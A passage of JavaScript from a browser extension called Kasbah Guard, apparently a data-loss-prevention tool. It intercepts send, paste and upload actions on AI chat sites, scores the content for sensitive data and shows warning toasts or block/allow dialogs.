    try { icon.innerHTML = '<svg viewBox="0 0 100 100" width="24" height="24" fill="none" stroke="currentColor" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"><g><path d="M 20 40 L 30 20 L 40 35 L 40 55"/><path d="M 50 30 L 60 12 L 70 30 L 70 55"/><path d="M 80 40 L 90 20 L 98 35 L 98 55"/><path d="M 15 58 L 98 58 L 98 75 L 15 75 Z"/><line x1="35" y1="58" x2="35" y2="75"/><line x1="55" y1="58" x2="55" y2="75"/><line x1="75" y1="58" x2="75" y2="75"/></g></svg>'; } catch(e) { icon.textContent = "\uD83C\uDFF0"; }
    toast.appendChild(icon);

    var textWrap = document.createElement("div");
    textWrap.style.cssText = "flex:1;min-width:0";
    var title = document.createElement("div");
    title.style.cssText = "font-size:13px;font-weight:800;margin-bottom:2px;letter-spacing:-.3px";
    title.textContent = isError ? 'Blocked by Kasbah' : 'Kasbah Warning';
    var detail = document.createElement("div");
    detail.style.cssText = "font-size:12px;opacity:.85;line-height:1.4";
    detail.textContent = message;
    textWrap.appendChild(title);
    textWrap.appendChild(detail);
    toast.appendChild(textWrap);

    document.body.appendChild(toast);
    setTimeout(function () {
      toast.style.animation = 'kasbahSlideOut .3s ease forwards';
      setTimeout(function () { if (toast.parentNode) toast.remove(); }, 300);
    }, isError ? 5500 : 4000);
  }

  // ── Helpers ──
  function host() { return location.hostname; }

  function product() {
    var h = host();
    if (h.indexOf("chatgpt") !== -1 || h.indexOf("openai") !== -1) return "chatgpt";
    if (h.indexOf("claude") !== -1) return "claude";
    if (h.indexOf("gemini") !== -1 || h.indexOf("aistudio.google") !== -1) return "gemini";
    if (h.indexOf("perplexity") !== -1) return "perplexity";
    if (h.indexOf("poe.com") !== -1) return "poe";
    if (h.indexOf("deepseek") !== -1) return "deepseek";
    if (h.indexOf("grok") !== -1) return "grok";
    if (h.indexOf("copilot") !== -1) return "copilot";
    if (h.indexOf("huggingface") !== -1) return "huggingchat";
    if (h.indexOf("you.com") !== -1) return "you";
    if (h.indexOf("pi.ai") !== -1) return "pi";
    if (h.indexOf("mistral") !== -1) return "mistral";
    if (h.indexOf("manus") !== -1) return "manus";
    if (h.indexOf("cursor") !== -1) return "cursor";
    if (h.indexOf("windsurf") !== -1 || h.indexOf("codeium") !== -1) return "windsurf";
    if (h.indexOf("notebooklm") !== -1 || h.indexOf("labs.google") !== -1) return "notebooklm";
    if (h.indexOf("meta.ai") !== -1) return "meta";
    if (h.indexOf("cohere") !== -1) return "cohere";
    if (h.indexOf("lmsys") !== -1) return "chatbot-arena";
    if (h.indexOf("open-assistant") !== -1) return "open-assistant";
    return "ai-tool";
  }

  function findComposerText() {
    // Platform-specific selectors first for accuracy
    var selectors = [
      // ChatGPT
      '#prompt-textarea',
      // Claude
      '.ProseMirror[contenteditable="true"]',
      // Gemini
      '.ql-editor[contenteditable="true"]',
      'rich-textarea [contenteditable="true"]',
      // Perplexity
      'textarea[placeholder*="Ask"]',
      // DeepSeek
      '#chat-input',
      // Copilot
      '#searchbox',
      'textarea[id*="user"]',
      // Grok
      'textarea[data-testid*="input"]',
      // Mistral
      '.chat-input textarea',
      // Generic fallbacks (works for Poe, HuggingChat, You, Pi, Meta, Cohere, etc.)
      '[contenteditable="true"]',
      'textarea',
      '.ProseMirror',
    ];
    for (var i = 0; i < selectors.length; i++) {
      var el = document.querySelector(selectors[i]);
      if (!el) continue;
      var t = "";
      if (el.tagName === "TEXTAREA" || el.tagName === "INPUT") {
        t = (el.value || "").trim();
      } else {
        t = (el.innerText || el.textContent || "").trim();
      }
      if (t) return t.slice(0, 6000);
    }
    return "";
  }

  function isSendButton(btn) {
    if (!btn) return false;
    var a = (btn.getAttribute("aria-label") || "").toLowerCase();
    var t = (btn.getAttribute("title") || "").toLowerCase();
    var txt = (btn.innerText || "").toLowerCase().trim();
    var did = (btn.getAttribute("data-testid") || "").toLowerCase();
    var cls = (btn.getAttribute("class") || "").toLowerCase();
    var tag = btn.tagName.toLowerCase();
    var clickable = tag === "button" || (tag === "div" && btn.getAttribute("role") === "button") || tag === "span";
    if (!clickable) return false;

    // Universal send/submit detection across all AI platforms
    var sendTerms = ["send", "submit", "enter", "go"];
    for (var i = 0; i < sendTerms.length; i++) {
      var st = sendTerms[i];
      if (a.indexOf(st) !== -1 || t.indexOf(st) !== -1 || did.indexOf(st) !== -1) return true;
    }

    // Text-based detection
    if (txt === "send" || txt === "send message" || txt === "submit" || txt === "ask"
        || txt === "generate" || txt === "search" || txt === "run") return true;

    // Class-based detection for platforms that use class names
    if (cls.indexOf("send") !== -1 || cls.indexOf("submit") !== -1) return true;

    // SVG icon detection: many platforms use an SVG arrow icon in the send button
    var svg = btn.querySelector("svg");
    if (svg) {
      var path = svg.querySelector("path");
      if (path) {
        var d = (path.getAttribute("d") || "").toLowerCase();
        // Common send arrow path patterns (paper plane / arrow)
        if (d.indexOf("m2") !== -1 && d.indexOf("l20") !== -1) return true; // common arrow
      }
      // Check if button has only an SVG child (icon-only send buttons)
      if (btn.children.length === 1 && btn.children[0].tagName === "svg") {
        // Check position: send buttons are usually at the right side of input area
        var rect = btn.getBoundingClientRect();
        var parent = btn.parentElement;
        if (parent) {
          var prect = parent.getBoundingClientRect();
          // If button is in the right portion and near bottom of a chat input area
          if (rect.left > prect.right - 100) {
            // Check if there's a textarea or contenteditable nearby
            var nearby = parent.querySelector('textarea, [contenteditable="true"]');
            if (nearby) return true;
          }
        }
      }
    }

    return false;
  }

  // ── Modal UI ──
  function createModal(opts) {
    var risk = opts.risk || "low";
    var secrets = opts.secrets || [];
    var preview = opts.preview || "";
    var verb = opts.verb || "send";
    var onAllow = opts.onAllow;
    var onBlock = opts.onBlock;

    var colors = {
      critical: { bg: "#fef2f2", border: "#fca5a5", text: "#7f1d1d", badge: "#991b1b", badgeBg: "rgba(153,27,27,.15)" },
      high:   { bg: "#fef2f2", border: "#fed7d7", text: "#7f1d1d", badge: "#dc2626", badgeBg: "rgba(220,38,38,.1)" },
      medium: { bg: "#fffbeb", border: "#fed3b7", text: "#78350f", badge: "#d97706", badgeBg: "rgba(217,119,6,.1)" },
      low:    { bg: "#f0fdf4", border: "#a7f3d0", text: "#166534", badge: "#16a34a", badgeBg: "rgba(34,197,94,.1)" },
    };
    var c = colors[risk] || colors.high;

    var verbLabels = {
      send: "Sending message",
      paste: "Pasting content",
      upload: "Uploading file",
      browse: "Sharing URL",
      edit: "Applying edit",
      download: "Downloading file"
    };

    var overlay = document.createElement("div");
    overlay.setAttribute("role", "dialog");
    overlay.setAttribute("aria-modal", "true");
    overlay.setAttribute("aria-label", "Kasbah Guard — sensitive data review");
    overlay.style.cssText = "position:fixed;inset:0;z-index:2147483647;background:rgba(0,0,0,.45);display:flex;align-items:center;justify-content:center;padding:16px;font-family:system-ui,-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;backdrop-filter:blur(3px);-webkit-backdrop-filter:blur(3px)";

    var card = document.createElement("div");
    card.setAttribute("role", "document");
    card.style.cssText = "width:min(520px,94vw);background:#fafaf9;border:1px solid #e4e4e7;border-radius:18px;box-shadow:0 20px 60px rgba(0,0,0,.2),0 0 1px rgba(0,0,0,.1);overflow:hidden";

    // Header with Kasbah fortress red accent
    var header = document.createElement("div");
    header.style.cssText = "padding:18px 20px;display:flex;align-items:center;justify-content:space-between;border-bottom:1.5px solid #ede8e3;background:linear-gradient(135deg,rgba(193,68,14,.02),rgba(212,197,185,.02))";
    var brand = document.createElement("div");
    brand.style.cssText = "display:flex;align-items:center;gap:10px";

    // Kasbah fortress logo (SVG)
    var mark = document.createElement("div");
    mark.style.cssText = "width:32px;height:32px;border-radius:8px;background:linear-gradient(135deg,#dc2626,#991b1b);display:flex;align-items:center;justify-content:center;color:#fff;flex-shrink:0;padding:4px;box-shadow:0 2px 8px rgba(220,38,38,.3)";
    try { mark.innerHTML = '<svg viewBox="0 0 100 100" width="22" height="22" fill="none" stroke="currentColor" stroke-width="3.5" stroke-linecap="round" stroke-linejoin="round"><g><path d="M 20 40 L 30 20 L 40 35 L 40 55"/><path d="M 50 30 L 60 12 L 70 30 L 70 55"/><path d="M 80 40 L 90 20 L 98 35 L 98 55"/><path d="M 15 58 L 98 58 L 98 75 L 15 75 Z"/><line x1="35" y1="58" x2="35" y2="75"/><line x1="55" y1="58" x2="55" y2="75"/><line x1="75" y1="58" x2="75" y2="75"/></g></svg>'; } catch(e) { mark.textContent = "\uD83C\uDFF0"; }
    brand.appendChild(mark);

    var bname = document.createElement("span");
    bname.style.cssText = "font-weight:900;font-size:14px;color:#18181b;letter-spacing:-.4px";
    bname.textContent = "Kasbah Guard";
    brand.appendChild(bname);

    // Verb tag
    var verbTag = document.createElement("span");
    verbTag.style.cssText = "font-size:11px;font-weight:700;padding:4px 10px;border-radius:8px;background:" + c.badgeBg + ";color:" + c.badge + ";margin-left:8px;text-transform:uppercase;letter-spacing:.5px";
    verbTag.textContent = verb;
    brand.appendChild(verbTag);

    var badge = document.createElement("span");
    badge.style.cssText = "font-size:12px;font-weight:700;padding:6px 12px;border-radius:8px;color:#fff;background:" + c.badge + ";flex-shrink:0";
    badge.textContent = risk === "high" ? "⚠️ Needs review" : risk === "medium" ? "⏸️ Quick check" : "✓ Looks good";
    header.appendChild(brand);
    header.appendChild(badge);

    // Body
    var body = document.createElement("div");
    body.style.cssText = "padding:16px";

    // Alert with improved styling
    if (secrets.length > 0 || risk !== "low") {
      var alert = document.createElement("div");
      alert.style.cssText = "background:" + c.bg + ";border:1.5px solid " + c.border + ";border-radius:12px;padding:14px;margin-bottom:14px";
      var alertTitle = document.createElement("div");
      alertTitle.style.cssText = "font-size:14px;font-weight:800;color:" + c.text + ";margin-bottom:4px;display:flex;align-items:center;gap:6px";
      var alertIcon = document.createElement("span");
      alertIcon.style.cssText = "font-size:16px";
      alertIcon.textContent = secrets.length > 0 ? "🔐" : "⚠️";
      alertTitle.appendChild(alertIcon);
      var alertTitleText = document.createElement("span");
      alertTitleText.textContent = secrets.length > 0 ? "Sensitive data detected" : "Heads up";
      alertTitle.appendChild(alertTitleText);
      var alertDesc = document.createElement("div");
      alertDesc.style.cssText = "font-size:13px;color:" + c.text + ";line-height:1.5;opacity:.9";
      // Show exactly what was detected, not a generic message
      alertDesc.textContent = secrets.length > 0
        ? "Found: " + secrets.join(", ")
        : "This may need a second look before sharing.";
      alert.appendChild(alertTitle);
      alert.appendChild(alertDesc);

      // Findings list with severity dots
      if (secrets.length > 0) {
        var findingsList = document.createElement("div");
        findingsList.style.cssText = "margin-top:8px;display:flex;flex-wrap:wrap;gap:5px";
        var maxShow = Math.min(secrets.length, 5);
        for (var fi = 0; fi < maxShow; fi++) {
          var finding = document.createElement("span");
          var sevDot = risk === "high" ? "#dc2626" : risk === "medium" ? "#d97706" : "#16a34a";
          finding.style.cssText = "display:inline-flex;align-items:center;gap:4px;padding:3px 8px;border-radius:6px;background:rgba(0,0,0,.04);font-size:10px;font-weight:700;color:" + c.text;
          finding.innerHTML = '<span style="width:6px;height:6px;border-radius:50%;background:' + sevDot + ';flex-shrink:0"></span>' + secrets[fi];
          findingsList.appendChild(finding);
        }
        if (secrets.length > 5) {
          var more = document.createElement("span");
          more.style.cssText = "font-size:10px;color:" + c.text + ";font-weight:600;align-self:center;padding:3px 6px";
          more.textContent = "+" + (secrets.length - 5) + " more";
          findingsList.appendChild(more);
        }
        alert.appendChild(findingsList);
      }
      body.appendChild(alert);
    }

    // Preview
    if (preview) {
      var pre = document.createElement("div");
      pre.style.cssText = "background:#f4f4f5;border:1px solid #e4e4e7;border-radius:8px;padding:10px;font:11px/1.5 ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,monospace;color:#52525b;max-height:120px;overflow:auto;word-break:break-all;margin-bottom:12px";
      pre.textContent = preview.slice(0, 300) + (preview.length > 300 ? "…" : "");
      body.appendChild(pre);
    }

    // Message — one clear line
    var msg = document.createElement("div");
    msg.style.cssText = "font-size:13px;color:#64748b;line-height:1.6;margin-bottom:16px";
    msg.textContent = "Kasbah caught sensitive data before it left your device. Block to stay safe, or proceed at your own risk.";
    body.appendChild(msg);

    // Buttons — Block is RED PRIMARY (right), Allow is ghost (left)
    var row = document.createElement("div");
    row.style.cssText = "display:flex;gap:10px;justify-content:flex-end;margin-top:16px;padding-top:12px;border-top:1px solid #ede8e3";

    // Allow = secondary / ghost (left)
    var allowBtn = document.createElement("button");
    allowBtn.type = "button";
    allowBtn.textContent = "Proceed Anyway";
    allowBtn.style.cssText = "font:600 13px system-ui;padding:10px 18px;border-radius:10px;cursor:pointer;border:1.5px solid #e2e8f0;background:#f8fafc;color:#64748b;transition:all .2s;pointer-events:auto;user-select:none";

    var allowBtnHover = function() { allowBtn.style.borderColor = "#cbd5e1"; allowBtn.style.color = "#1e293b"; };
    var allowBtnUnhover = function() { allowBtn.style.borderColor = "#e2e8f0"; allowBtn.style.color = "#64748b"; };
    allowBtn.addEventListener("mouseover", allowBtnHover, true);
    allowBtn.addEventListener("mouseout", allowBtnUnhover, true);

    // Block = PRIMARY red (right) — Kasbah brand color
    var blockBtn = document.createElement("button");
    blockBtn.type = "button";
    blockBtn.textContent = "Block — Stay Safe";
    blockBtn.style.cssText = "font:800 13px system-ui;padding:10px 22px;border-radius:10px;cursor:pointer;border:0;background:linear-gradient(135deg,#C1440E,#9a350b);color:#fff;transition:all .2s;box-shadow:0 2px 8px rgba(193,68,14,.3);pointer-events:auto;user-select:none";

    var blockBtnHover = function() { blockBtn.style.boxShadow = "0 4px 14px rgba(193,68,14,.45)"; blockBtn.style.transform = "translateY(-1px)"; };
    var blockBtnUnhover = function() { blockBtn.style.boxShadow = "0 2px 8px rgba(193,68,14,.3)"; blockBtn.style.transform = ""; };
    blockBtn.addEventListener("mouseover", blockBtnHover, true);
    blockBtn.addEventListener("mouseout", blockBtnUnhover, true);
    var hasCritical = false; // kept for logging

    var blockBtnDown = function () { blockBtn.style.transform = "scale(.96)"; };
    var blockBtnUp = function () { blockBtn.style.transform = ""; };
    var allowBtnDown = function () { allowBtn.style.transform = "scale(.96)"; };
    var allowBtnUp = function () { allowBtn.style.transform = ""; };

    blockBtn.addEventListener("mousedown", blockBtnDown, true);
    blockBtn.addEventListener("mouseup", blockBtnUp, true);
    allowBtn.addEventListener("mousedown", allowBtnDown, true);
    allowBtn.addEventListener("mouseup", allowBtnUp, true);

    // Bulletproof overlay removal — called by every dismiss path
    var dismissed = false;
    function dismissOverlay() {
      if (dismissed) return;
      dismissed = true;
      overlay.style.opacity = "0";
      overlay.style.transition = "opacity .15s ease";
      setTimeout(function () {
        try { overlay.style.pointerEvents = "none"; overlay.remove(); } catch(e) {}
      }, 200);
    }

    // Use addEventListener instead of onclick for 0-friction button handling
    var handleBlockClick = function (e) {
      e.preventDefault();
      e.stopPropagation();
      e.stopImmediatePropagation();
      try { if (onBlock) onBlock(); } catch(e) { console.error("[Kasbah] onBlock error:", e); }
      dismissOverlay();
    };
    var handleAllowClick = function (e) {
      e.preventDefault();
      e.stopPropagation();
      e.stopImmediatePropagation();
      try { if (onAllow) onAllow(); } catch(e) { console.error("[Kasbah] onAllow error:", e); }
      dismissOverlay();
    };

    blockBtn.addEventListener("click", handleBlockClick, true);
    allowBtn.addEventListener("click", handleAllowClick, true);

    // Safety: click backdrop (outside card) → dismiss as block
    var handleBackdropClick = function (e) {
      if (e.target === overlay) {
        e.preventDefault();
        e.stopPropagation();
        try { if (onBlock) onBlock(); } catch(e2) {}
        dismissOverlay();
      }
    };
    overlay.addEventListener("click", handleBackdropClick, true);

    // Safety: Escape key → dismiss as block
    var escHandler = function (e) {
      if (e.key === "Escape") {
        try { if (onBlock) onBlock(); } catch(e2) {}
        dismissOverlay();
        document.removeEventListener("keydown", escHandler, true);
      }
    };
    document.addEventListener("keydown", escHandler, true);

    // Safety: auto-dismiss after 30 seconds (fail-safe against frozen UI)
    setTimeout(function () {
      if (!dismissed) {
        console.warn("[Kasbah] Modal auto-dismissed after 30s safety timeout");
        try { if (onBlock) onBlock(); } catch(e) {}
        dismissOverlay();
      }
      document.removeEventListener("keydown", escHandler, true);
    }, 30000);

    row.appendChild(allowBtn);  // ghost — left
    row.appendChild(blockBtn);  // primary red — right
    body.appendChild(row);

    card.appendChild(header);
    card.appendChild(body);
    overlay.appendChild(card);
    document.documentElement.appendChild(overlay);

    return overlay;
  }

  // ── Helper: run decide+modal flow for any verb ──
  function guardFlow(verb, text, extraMeta, onAllowCb, onBlockCb) {
    // Use unified detection engine (classify) for all verbs
    var res = typeof classify !== 'undefined' ? classify(text) : { decision: "ALLOW", risk: 0, reason: "No detector available" };

    // UPLOAD verb: Check for sensitive filenames (they should trigger HIGH RISK)
    if (verb === "upload" && extraMeta && extraMeta.sensitive_filenames && extraMeta.sensitive_filenames.length > 0) {
      console.log("[Kasbah] guardFlow - UPLOAD with sensitive filenames:", extraMeta.sensitive_filenames);
      res = { decision: "DENY", risk: 80, reason: "Sensitive document detected: " + extraMeta.sensitive_filenames.join(", ") };
    }
    // UPLOAD escalation: uploads are irreversible — any suspicion must block
    if (verb === "upload" && res.decision !== "DENY" && res.risk >= 30) {
      console.log("[Kasbah] Upload escalation: risk", res.risk, "→ DENY (uploads are high-stakes)");
      res = { decision: "DENY", risk: Math.max(res.risk, 70), reason: (res.reason || "Suspicious content") + " — upload requires review" };
    }
    console.log("[Kasbah] guardFlow - verb:", verb, "decision:", res.decision, "risk:", res.risk);

    // Build metadata for logging
    var meta = {
      length: text.length,
      preview: text.slice(0, 200),
      risk: res.risk,
      reason: res.reason,
      decision: res.decision,
    };
    if (extraMeta) {
      for (var k in extraMeta) {
        if (extraMeta.hasOwnProperty(k)) meta[k] = extraMeta[k];
      }
    }

    // ═══════════════════════════════════════════════════════════════
    // TIER 1: SILENT (intervention === "silent") — Zero friction
    // ═════════════════════════════════════════════════════════════════
    // Pass silently with no UI, no modal, no toast. Extension is invisible.
    // Risk < 30 — low-confidence findings don't interrupt workflow.
    if (res.decision === "ALLOW" && res.risk < 30) {
      try {
        var logs = JSON.parse(localStorage.getItem('kasbah_logs') || '[]');
        logs.push({
          action: 'SILENT_ALLOW',
          verb: verb,
          risk: res.risk,
          text: text.slice(0, 100),
          reason: res.reason,
          time: new Date().toISOString()
        });
        localStorage.setItem('kasbah_logs', JSON.stringify(logs.slice(-100)));
      } catch(e) {}
      if (onAllowCb) onAllowCb();
      return;
    }

    // ═══════════════════════════════════════════════════════════════
    // TIER 2: WARNING (intervention === "warning") — Toast only
    // ═════════════════════════════════════════════════════════════════
    // Show inline toast notification, but proceed immediately.
    // Risk 30-70 — medium confidence, flag but don't block workflow.
    // User can still act, but they're informed.
    if (res.decision === "WARN" && res.risk >= 30 && res.risk <= 70) {
      showToast("⚠️ Heads up — " + res.reason + " detected. Review recommended.", false, verb);
      try {
        var logs = JSON.parse(localStorage.getItem('kasbah_logs') || '[]');
        logs.push({
          action: 'WARN_TOAST',
          verb: verb,
          risk: res.risk,
          text: text.slice(0, 100),
          reason: res.reason,
          time: new Date().toISOString()
        });
        localStorage.setItem('kasbah_logs', JSON.stringify(logs.slice(-100)));
      } catch(e) {}
      if (onAllowCb) onAllowCb();
      return;
    }

    // ═══════════════════════════════════════════════════════════════
    // TIER 3: BLOCK (intervention === "block") — Full modal
    // ═════════════════════════════════════════════════════════════════
    // High-risk → show modal, require explicit user decision.
    // Risk > 70 — high confidence, block by default with override option.
    if (res.decision === "DENY" || res.risk > 70) {
      createModal({
        risk: res.risk > 85 ? "critical" : "high",
        secrets: [res.reason || "High-risk content detected"],
        preview: text.slice(0, 400),
        verb: verb,
        onAllow: function () {
          // Set approval window so egress gate doesn't double-block
          window.__kasbah_approved_until = Date.now() + 5000;
          try {
            var logs = JSON.parse(localStorage.getItem('kasbah_logs') || '[]');
            logs.push({
              action: 'OVERRIDE_ALLOW',
              verb: verb,
              risk: res.risk,
              text: text.slice(0, 100),
              reason: res.reason,
              time: new Date().toISOString()
            });
            localStorage.setItem('kasbah_logs', JSON.stringify(logs.slice(-100)));
          } catch(e) {}
          // CRITICAL FIX: Defer callback with setTimeout so it happens AFTER modal handler completes
          setTimeout(function() {
            if (onAllowCb) onAllowCb();
          }, 0);
        },
        onBlock: function () {
          showToast("✓ Blocked. Your sensitive data stayed on your device.", true, verb);
          try {
            var logs = JSON.parse(localStorage.getItem('kasbah_logs') || '[]');
            logs.push({
              action: 'BLOCKED',
              verb: verb,
              risk: res.risk,
              text: text.slice(0, 100),
              reason: res.reason,
              time: new Date().toISOString()
            });
            localStorage.setItem('kasbah_logs', JSON.stringify(logs.slice(-100)));
          } catch(e) {}
          if (onBlockCb) onBlockCb();
          try { chrome.runtime.sendMessage({ type: 'BLOCK_EVENT', verb: verb }); } catch(e) {}
        },
      });
      return;
    }
  }

  // Guard is always local — no heartbeat needed (zero server dependency)
  function failClosedCheck() { return false; }

  // ═══════════════════════════════════════════════════
  // L1: BEFOREINPUT — Intercept programmatic text insertion
  // ═══════════════════════════════════════════════════
  document.addEventListener("beforeinput", function (ev) {
    // Only intercept paste/drop insertions with meaningful content
    if (ev.inputType !== "insertFromPaste" && ev.inputType !== "insertFromDrop") return;

    var data = ev.data || "";
    if (ev.dataTransfer) {
      data = ev.dataTransfer.getData("text/plain") || ev.dataTransfer.getData("text") || "";
    }

    // Check for secrets FIRST (any length)
    var secrets = scanSecrets(data);

    // Only trigger if secrets found OR substantial content
    if (secrets.length === 0 && data.length < 100) return;

    // If no secrets AND we got here (must be >100 chars), allow it
    if (secrets.length === 0) return;

    // This is a programmatic insertion with secrets — block it
    ev.preventDefault();
    ev.stopPropagation();

    showToast("Kasbah Guard caught a paste with personal info — review before sharing", false);
  }, true);

  // ═══════════════════════════════════════════════════
  // L1: MUTATION OBSERVER — Detect programmatic content injection
  // ═══════════════════════════════════════════════════
  (function () {
    var observer = new MutationObserver(function (mutations) {
      for (var m = 0; m < mutations.length; m++) {
        var mutation = mutations[m];
        if (mutation.type !== "characterData" && mutation.type !== "childList") continue;

        var target = mutation.target;
        if (!target) continue;

        // Only monitor contenteditable and textarea parents
        var editable = target.closest ? target.closest('[contenteditable="true"]') : null;
        if (!editable && target.tagName !== "TEXTAREA") continue;

        var text = "";
        if (target.tagName === "TEXTAREA") {
          text = target.value || "";
        } else if (editable) {
          text = (editable.innerText || editable.textContent || "").trim();
        }

        // Only check substantial programmatic injections
        if (text.length < 200) continue;

        var secrets = scanSecrets(text);
        if (secrets.length === 0) continue;

      }
    });

    // Observe the whole document for content changes
    observer.observe(document.body || document.documentElement, {
      childList: true,
      characterData: true,
      subtree: true,
    });
  })();

  // ═══════════════════════════════════════════════════
  // VERB 1: SEND — Intercept Send button click
  // ═══════════════════════════════════════════════════
  document.addEventListener(
    "click",
    function (ev) {
      var target = ev.target;
      var btn = target && target.closest ? target.closest("button,[role='button']") : null;
      if (!btn) return;
      if (!isSendButton(btn)) return;

      // Skip if we flagged this click as allowed
      if (btn[FLAG_KEY]) {
        btn[FLAG_KEY] = false;
        return;
      }

      ev.preventDefault();
      ev.stopPropagation();
      ev.stopImmediatePropagation();

      // L6: Fail-closed check
      if (failClosedCheck("send", null)) return;

      var msg = findComposerText();
      var secrets = scanSecrets(msg);
      var score = riskScore(msg, secrets);
      var risk = riskLabel(score);
      var urls = extractUrls(msg);

      var meta = {
        length: msg.length,
        preview: msg.slice(0, 200),
        secrets: secrets,
        risk: score,
      };
      if (urls.length > 0) meta.urls = urls;

      var decidePayload = {
        product: product(),
        host: host(),
        action: "chat.send",
        verb: "send",
        text: msg,
        meta: meta,
      };

      var res = typeof classify !== "undefined" ? classify(msg) : { decision: "ALLOW", risk: 0 };

      // SILENT/WARN: risk < 70 — let action proceed, maybe show toast
      if (res.decision !== "DENY") {
        if (res.decision === "WARN") {
          showToast("Heads up — " + (secrets.length > 0 ? secrets[0] + " detected" : "review recommended"), false, "send");
        }
        // Log allowed action
        try {
          var logs = JSON.parse(localStorage.getItem('kasbah_logs') || '[]');
          logs.push({ action: res.decision, text: msg.slice(0, 100), risk: res.risk, time: new Date().toISOString() });
          localStorage.setItem('kasbah_logs', JSON.stringify(logs.slice(-100)));
        } catch(e) {}
        // Proceed with action
        btn[FLAG_KEY] = true;
        btn.click();
        return;
      }

      // BLOCK: risk >= 70 — show modal, user decides
      createModal({
        risk: "high",
        secrets: secrets.length > 0 ? secrets : ["Review needed"],
        preview: msg.slice(0, 400),
        verb: "send",
        onAllow: function () {
          // Set approval window so egress gate doesn't double-block
          window.__kasbah_approved_until = Date.now() + 5000;
          // Log to localStorage
          try {
            var logs = JSON.parse(localStorage.getItem('kasbah_logs') || '[]');
            logs.push({ action: 'ALLOW_OVERRIDE', text: msg.slice(0, 100), time: new Date().toISOString() });
            localStorage.setItem('kasbah_logs', JSON.stringify(logs.slice(-100)));
          } catch(e) {}
          // CRITICAL FIX: Defer click with setTimeout so it happens AFTER event handler completes
          // Otherwise preventDefault() from original event blocks the synthetic click
          setTimeout(function() {
            btn[FLAG_KEY] = true;
            btn.click();
          }, 0);
        },
        onBlock: function () {
          // Log to localStorage
          try {
            var logs = JSON.parse(localStorage.getItem('kasbah_logs') || '[]');
            logs.push({ action: 'DENIED', text: msg.slice(0, 100), time: new Date().toISOString() });
            localStorage.setItem('kasbah_logs', JSON.stringify(logs.slice(-100)));
          } catch(e) {}
          showToast("Message not sent — your choice", false);
        },
      });
    },
    true
  );

  // ═══════════════════════════════════════════════════
  // VERB 2: PASTE — Intercept clipboard paste events
  // ═══════════════════════════════════════════════════
  document.addEventListener(
    "paste",
    function (ev) {
      // Skip if we already approved this paste
      if (document[PASTE_FLAG]) {
        document[PASTE_FLAG] = false;
        return;
      }

      // Check for pasted images (screenshots of passports, IDs, etc.)
      if (ev.clipboardData && ev.clipboardData.items) {
        for (var ci = 0; ci < ev.clipboardData.items.length; ci++) {
          var item = ev.clipboardData.items[ci];
          if (item.type && item.type.indexOf("image") !== -1) {
            var imgFile = item.getAsFile();
            if (imgFile) {
              ev.preventDefault();
              ev.stopImmediatePropagation();
              var imgName = imgFile.name || "pasted-image." + (imgFile.type.split("/")[1] || "png");
              var imgMeta = { file_count: 1, total_size: imgFile.size, file_names: [imgName], sensitive_filenames: [], source: "clipboard-image" };
              console.log("[Kasbah] Pasted image intercepted:", imgName, imgFile.type, imgFile.size + " bytes");
              guardFlow("upload", "Pasted image: " + imgName + " (" + (imgFile.size / 1024).toFixed(1) + "KB, " + imgFile.type + ")", imgMeta,
                function () {
                  // Allow: write image back and re-paste
                  try {
                    document[PASTE_FLAG] = true;
                    // Can't replay image paste reliably — tell user to paste again
                    showToast("✓ Approved — paste the image again (Ctrl+V)", false, "upload");
                  } catch(e) {}
                },
                function () {
                  showToast("✓ Image upload blocked — your data stayed on your device.", true, "upload");
                }
              );
              return;
            }
          }
        }
      }

      var clipText = "";
      if (ev.clipboardData) {
        clipText = ev.clipboardData.getData("text") || "";
      }

      // Only intercept if paste has meaningful content
      if (clipText.length < 20) return;

      // Use unified detector to classify clipboard content
      var res = typeof classify !== 'undefined' ? classify(clipText) : { decision: "ALLOW", risk: 0 };

      // For SILENT/ALLOW, let it through without interception (any length)
      if (res.decision === "ALLOW") return;

      ev.preventDefault();
      ev.stopImmediatePropagation();

      // L6: Fail-closed check
      if (failClosedCheck("paste", null)) return;

      var activeEl = document.activeElement;

      guardFlow("paste", clipText, { source: "clipboard", detected_risk: res.risk, detected_reason: res.reason },
        function () {
          // Allow: re-focus and re-paste after modal dismissal
          // Must delay because focus is on the modal until it's removed
          setTimeout(function () {
            try {
              // Re-focus the original element
              if (activeEl) activeEl.focus();
            } catch(e) {}

            // Give focus time to settle, then insert
            setTimeout(function () {
              var el = activeEl || document.activeElement;
              if (!el) return;

              var inserted = false;

              // Method 1: contenteditable (ChatGPT, Claude, DeepSeek, etc.)
              if (el.isContentEditable || (el.closest && el.closest('[contenteditable="true"]'))) {
                var editableEl = el.isContentEditable ? el : el.closest('[contenteditable="true"]');
                try { editableEl.focus(); } catch(e) {}
                // Place cursor at end if selection is outside
                var sel = window.getSelection();
                if (!sel || !editableEl.contains(sel.anchorNode)) {
                  var range = document.createRange();
                  range.selectNodeContents(editableEl);
                  range.collapse(false);
                  sel = window.getSelection();
                  sel.removeAllRanges();
                  sel.addRange(range);
                }
                inserted = document.execCommand("insertText", false, clipText);
              }

              // Method 2: textarea/input
              if (!inserted && (el.tagName === "TEXTAREA" || el.tagName === "INPUT")) {
                var start = el.selectionStart || 0;
                var end = el.selectionEnd || 0;
                var val = el.value || "";
                el.value = val.slice(0, start) + clipText + val.slice(end);
                el.selectionStart = el.selectionEnd = start + clipText.length;
                el.dispatchEvent(new Event("input", { bubbles: true }));
                inserted = true;
              }

              // Method 3: last resort — write to clipboard, tell user to re-paste
              if (!inserted) {
                try {
                  navigator.clipboard.writeText(clipText).then(function() {
                    showToast("✓ Approved — press Ctrl+V to paste", false, "paste");
                  });
                } catch(e) {
                  showToast("✓ Approved — press Ctrl+V to paste", false, "paste");
                }
              }
            }, 50);
          }, 50);
        },
        function () { /* Block: do nothing, paste prevented */ }
      );
    },
    true
  );

  // ═══════════════════════════════════════════════════
  // VERB 3: UPLOAD — Intercept file inputs and drag-drop
  // ═══════════════════════════════════════════════════

  // File input change
  document.addEventListener(
    "change",
    function (ev) {
      var target = ev.target;
      console.log("[Kasbah] Upload change event - target:", target ? target.tagName : "null", target ? target.type : "");
      if (!target || target.tagName !== "INPUT" || target.type !== "file") {
        console.log("[Kasbah] Upload - skipping (not file input)");
        return;
      }
      if (target.__kasbah_allowed) {
        console.log("[Kasbah] Upload - already allowed, releasing");
        target.__kasbah_allowed = false;
        return;
      }

      var files = target.files;
      if (!files || files.length === 0) return;

